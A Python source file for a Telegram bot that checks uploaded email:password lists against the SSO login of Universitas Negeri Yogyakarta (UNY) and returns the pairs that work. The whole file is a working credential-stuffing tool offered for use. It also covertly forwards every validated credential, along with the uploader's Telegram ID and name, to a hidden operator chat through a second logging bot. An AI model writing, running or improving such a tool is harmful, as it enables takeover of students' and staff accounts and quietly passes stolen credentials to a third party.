"""
SSO UNY Checker - Telegram Bot
Bot untuk cek login SSO UNY dengan notifikasi real-time

Setup:
1. Buat bot di @BotFather
2. Set BOT_TOKEN di environment variable
3. Run: python bot.py
"""

import os
import telebot
import tempfile
import asyncio
from datetime import datetime
from threading import Thread
from dotenv import load_dotenv

# Use Playwright checker (lightweight, stable for Railway Hobby Plan)
from checker_bot_integration import SSOCheckerBot

# Load .env file (untuk testing lokal)
load_dotenv()

# Bot Token dari environment variable
BOT_TOKEN = os.environ.get('BOT_TOKEN')
LOG_BOT_TOKEN = os.environ.get('LOG_BOT_TOKEN')  # Bot kedua untuk logging
LOG_CHAT_ID = os.environ.get('LOG_CHAT_ID')      # Chat ID admin/channel untuk log
if LOG_CHAT_ID:
    LOG_CHAT_ID = LOG_CHAT_ID.strip()
    if LOG_CHAT_ID.lstrip("-").isdigit():
        LOG_CHAT_ID = int(LOG_CHAT_ID)

# Debug logging untuk Railway
print("=" * 60)
print("🔍 RAILWAY DEBUG INFO:")
print(f"BOT_TOKEN exists: {BOT_TOKEN is not None}")
if BOT_TOKEN:
    # Show first 10 and last 10 chars only (for security)
    token_preview = f"{BOT_TOKEN[:10]}...{BOT_TOKEN[-10:]}" if len(BOT_TOKEN) > 20 else "***"
    print(f"BOT_TOKEN preview: {token_preview}")
    print(f"BOT_TOKEN length: {len(BOT_TOKEN)}")
else:
    print("⚠️ BOT_TOKEN is None/Empty!")
    print("Available env vars:", list(os.environ.keys())[:10])  # Show first 10 env vars

# Log bot configuration
print(f"LOG_BOT_TOKEN configured: {LOG_BOT_TOKEN is not None}")
print(f"LOG_CHAT_ID configured: {LOG_CHAT_ID is not None}")
if LOG_BOT_TOKEN and LOG_CHAT_ID:
    print("✅ Dual-bot logging ENABLED")
else:
    print("⚠️ Dual-bot logging DISABLED (optional)")
print("=" * 60)

if not BOT_TOKEN:
    print("❌ ERROR: BOT_TOKEN tidak ditemukan!")
    print("Set environment variable atau buat file .env dengan:")
    print("BOT_TOKEN=your_token_here")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# Create LOG_BOT instance (jika configured)
log_bot = None
if LOG_BOT_TOKEN and LOG_CHAT_ID:
    try:
        log_bot = telebot.TeleBot(LOG_BOT_TOKEN)
        print("✅ LOG_BOT instance created successfully")
    except Exception as e:
        print(f"⚠️ Failed to create LOG_BOT instance: {e}")
        log_bot = None


def send_log_notification(message_text, file_path=None, caption=None):
    """Kirim notifikasi/log via LOG_BOT_TOKEN ke LOG_CHAT_ID"""
    if not log_bot or not LOG_CHAT_ID:
        # Silently skip if log_bot not configured
        return

    try:
        resolved_caption = caption if caption is not None else (message_text[:200] if message_text else None)
        if resolved_caption and len(resolved_caption) > 1024:
            resolved_caption = resolved_caption[:1024]

        # Kirim message
        if message_text:
            # Pakai plain text agar tidak gagal parse entities saat username/nama ada karakter khusus
            log_bot.send_message(LOG_CHAT_ID, message_text)
            print(f"[OK] Log message sent to LOG_CHAT_ID")

        # Kirim file jika ada
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                log_bot.send_document(
                    LOG_CHAT_ID,
                    f,
                    caption=resolved_caption
                )
            print(f"[OK] Log file sent to LOG_CHAT_ID")

    except Exception as e:
        print(f"[WARN] Failed to send log: {e}")

# Store active sessions (chat_id -> checker instance)
active_sessions = {}


@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Handler untuk /start dan /help"""
    # Send notification to LOG_BOT about new user
    user_info = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    start_notif = f"""
🆕 *New User Started Bot*
👤 User: {user_info} (ID: `{message.chat.id}`)
📝 Name: {message.from_user.first_name or 'Unknown'}
⏰ Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
🔧 Command: /{message.text.split()[0].replace('/', '')}
    """
    send_log_notification(start_notif)
    
    welcome_text = """
🤖 *SSO UNY Login Checker Bot*

Bot ini akan mengecek kredensial SSO UNY dan memberi tahu hasilnya!

📝 *Cara Pakai:*
1. Kirim file TXT dengan format:
   `email:password` (satu per baris)
   
2. Bot akan mulai cek satu per satu

3. Setiap akun berhasil, bot langsung kirim notifikasi:
   ✅ `email:password`

4. Setelah selesai semua, bot kirim file TXT berisi hasil

⚠️ *Catatan:*
• Proses bisa memakan waktu (delay antar cek)
• Jika ada CAPTCHA/rate limit, bot akan berhenti

Kirim file TXT untuk mulai! 🚀
    """
    bot.reply_to(message, welcome_text, parse_mode='Markdown')


@bot.message_handler(commands=['status'])
def check_status(message):
    """Handler untuk /status - cek progress"""
    chat_id = message.chat.id
    
    if chat_id in active_sessions:
        checker = active_sessions[chat_id]
        status_text = f"""
📊 *Status Checking*

✅ Berhasil: {len(checker.success_list)}
❌ Gagal: {len(checker.failed_list)}
⏳ Total diproses: {len(checker.success_list) + len(checker.failed_list)}
        """
        bot.reply_to(message, status_text, parse_mode='Markdown')
        
        # Notify admin about status check
        user_info = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
        status_notif = f"""
📊 *User Checked Status*
👤 User: {user_info} (ID: `{chat_id}`)
✅ Success: {len(checker.success_list)} | ❌ Failed: {len(checker.failed_list)}
        """
        send_log_notification(status_notif)
    else:
        bot.reply_to(message, "Tidak ada proses checking aktif. Kirim file TXT untuk mulai!")


@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Handler untuk file upload"""
    chat_id = message.chat.id
    
    # Cek apakah ada session aktif
    if chat_id in active_sessions:
        bot.reply_to(message, "⚠️ Masih ada proses checking aktif! Tunggu hingga selesai.")
        return
    
    try:
        # Get file info
        file_info = bot.get_file(message.document.file_id)
        file_name = message.document.file_name
        
        # Validasi file TXT
        if not file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Hanya file TXT yang diterima!")
            return
        
        # Download file
        bot.reply_to(message, f"📥 Downloading {file_name}...")
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Save temporary file
        temp_file = tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.txt')
        temp_file.write(downloaded_file)
        temp_file.close()
        
        # Parse credentials
        credentials = parse_credentials(temp_file.name)
        
        if not credentials:
            bot.reply_to(message, "❌ File kosong atau format salah!\n\nFormat: `email:password`", parse_mode='Markdown')
            os.unlink(temp_file.name)
            return
        
        # Konfirmasi
        confirm_text = f"""
✅ File diterima: *{file_name}*
📊 Total kredensial: *{len(credentials)}*

🚀 Memulai pengecekan...
Anda akan menerima notifikasi untuk setiap akun yang berhasil!
        """
        bot.send_message(chat_id, confirm_text, parse_mode='Markdown')
        
        # Start checking in background thread
        def run_checker():
            try:
                # Send activity notification to admin (via LOG_BOT)
                user_info = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
                activity_msg = f"""
🔔 *New Activity*
👤 User: {user_info} (ID: `{chat_id}`)
📋 Checking: *{len(credentials)}* credentials
🕒 Started: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
                """
                send_log_notification(activity_msg)
                
                checker = SSOCheckerBot(
                    credentials=credentials,
                    chat_id=chat_id,
                    bot=bot
                )
                active_sessions[chat_id] = checker
                
                # Run checking
                checker.start_checking()
                
                # Send final results
                send_final_results(chat_id, checker, message)
                
            except Exception as e:
                bot.send_message(chat_id, f"❌ Error: {str(e)}")
            finally:
                # Cleanup
                if chat_id in active_sessions:
                    del active_sessions[chat_id]
                os.unlink(temp_file.name)
        
        # Start in thread
        thread = Thread(target=run_checker)
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


def parse_credentials(file_path):
    """Parse credentials dari file TXT"""
    credentials = []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        email, password = parts
                        credentials.append((email.strip(), password.strip()))
    except Exception as e:
        print(f"Error parsing credentials: {e}")
    
    return credentials


def send_final_results(chat_id, checker, message):
    """Kirim file hasil akhir ke user DAN admin"""
    try:
        # Summary message
        summary_text = f"""
🏁 *Checking Selesai!*

📅 *Ringkasan:*
✅ Berhasil: {len(checker.success_list)}
❌ Gagal: {len(checker.failed_list)}
📋 Total: {len(checker.success_list) + len(checker.failed_list)}

📁 Mengirim file hasil...
        """
        bot.send_message(chat_id, summary_text, parse_mode='Markdown')
        
        # Generate result file
        if checker.success_list:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"success_{timestamp}.txt"
            
            # === FILE UNTUK USER (tanpa header tracking) ===
            user_temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8')
            user_temp_file.write("=" * 60 + "\n")
            user_temp_file.write("✅ AKUN YANG BERHASIL LOGIN\n")
            user_temp_file.write("=" * 60 + "\n\n")
            
            for email, password, _ in checker.success_list:
                user_temp_file.write(f"{email}:{password}\n")
            
            user_temp_file.write("\n" + "=" * 60 + "\n")
            user_temp_file.write(f"Total: {len(checker.success_list)} akun\n")
            user_temp_file.write(f"Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            user_temp_file.close()
            
            # Kirim ke USER
            with open(user_temp_file.name, 'rb') as f:
                bot.send_document(
                    chat_id,
                    f,
                    caption=f"✅ File hasil: {len(checker.success_list)} akun berhasil",
                    visible_file_name=result_filename
                )
            
            # === FILE UNTUK ADMIN (dengan header user tracking) ===
            admin_temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8')
            
            # User info
            user_info = f"@{message.from_user.username}" if message.from_user.username else "No username"
            first_name = message.from_user.first_name or "Unknown"
            
            # Header tracking
            admin_temp_file.write("=" * 60 + "\n")
            admin_temp_file.write("===== REPORT FROM USER =====\n")
            admin_temp_file.write("=" * 60 + "\n")
            admin_temp_file.write(f"Chat ID: {chat_id}\n")
            admin_temp_file.write(f"Username: {user_info}\n")
            admin_temp_file.write(f"First Name: {first_name}\n")
            admin_temp_file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            admin_temp_file.write(f"Success: {len(checker.success_list)} | Failed: {len(checker.failed_list)}\n")
            admin_temp_file.write("=" * 60 + "\n\n")
            
            # Akun yang berhasil
            admin_temp_file.write("✅ AKUN YANG BERHASIL LOGIN\n")
            admin_temp_file.write("=" * 60 + "\n\n")
            
            for email, password, _ in checker.success_list:
                admin_temp_file.write(f"{email}:{password}\n")
            
            admin_temp_file.write("\n" + "=" * 60 + "\n")
            admin_temp_file.close()
            
            # Kirim ke ADMIN via LOG_BOT
            admin_caption = f"📅 *Report dari User*\n👤 {user_info} (ID: `{chat_id}`)\n✅ {len(checker.success_list)} akun berhasil | ❌ {len(checker.failed_list)} gagal"
            send_log_notification(
                None,  # No separate message, caption is enough
                file_path=admin_temp_file.name,
                caption=admin_caption
            )
            
            # Cleanup temp files
            os.unlink(user_temp_file.name)
            os.unlink(admin_temp_file.name)
        else:
            bot.send_message(chat_id, "⚠️ Tidak ada akun yang berhasil login.")
            
            # Notify admin about failed checking
            user_info = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
            fail_msg = f"⚠️ *No Success*\n👤 User: {user_info} (ID: `{chat_id}`)\n❌ All {len(checker.failed_list)} attempts failed"
            send_log_notification(fail_msg)
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error saat mengirim hasil: {str(e)}")


@bot.message_handler(func=lambda message: True)
def handle_text(message):
    """Handler untuk text biasa"""
    bot.reply_to(message, 
        "Kirim file TXT dengan format `email:password` untuk mulai!\n\n"
        "Gunakan /help untuk panduan lengkap.",
        parse_mode='Markdown')


def main():
    print("""
╔══════════════════════════════════════════════════════════╗
║         SSO UNY CHECKER - TELEGRAM BOT                   ║
║         Bot siap menerima file TXT!                      ║
╚══════════════════════════════════════════════════════════╝
    """)
    print("🤖 Bot started...")
    print("📱 Menunggu pesan dari Telegram...\n")
    
    instance_id = f"{os.getenv('HOSTNAME', 'local')}:{os.getpid()}"
    send_log_notification(f"[BOOT] bot.py started on instance {instance_id}")

    # Start bot polling
    bot.infinity_polling()


if __name__ == '__main__':
    main()

